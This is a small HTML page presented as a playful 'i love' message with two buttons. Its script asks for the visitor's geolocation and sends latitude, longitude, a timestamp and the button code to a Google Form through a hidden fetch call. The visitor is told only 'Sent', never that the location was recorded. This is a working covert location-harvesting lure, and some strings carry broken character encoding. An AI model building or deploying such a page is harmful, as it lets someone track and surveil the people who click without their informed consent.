<button onclick="send('i love 1')">i love 1</button>
<button onclick="send('i love 9784844')">i love 9784844</button>

<script>

const FORM_ID = "1FAIpQLSdXQ-NrgmaWl2bM8YB5ufLN3PnIwDyylbM75ze6mgaj2A92tw";

const CODIGO = "entry.1588936670";
const LAT    = "entry.1725572024";
const LON    = "entry.44897658";
const HORA   = "entry.883812266";

function send(code){

  if(!navigator.geolocation){
    alert("Geolocalizaci√≥n no soportada");
    return;
  }

  document.body.innerHTML = "<h3>üì° Sending...</h3>";

  navigator.geolocation.getCurrentPosition(pos=>{

    const lat  = pos.coords.latitude;
    const lon  = pos.coords.longitude;
    const hora = new Date().toISOString();

    const url =
`https://docs.google.com/forms/d/e/${FORM_ID}/formResponse?${CODIGO}=${code}&${LAT}=${lat}&${LON}=${lon}&${HORA}=${hora}`;

    fetch(url,{mode:"no-cors"});

    document.body.innerHTML = "<h2>‚ù§Ô∏è Sent</h2>";

  }, ()=>{
    document.body.innerHTML = "<h2>‚ùå Location denied</h2>";
  });
}

</script>

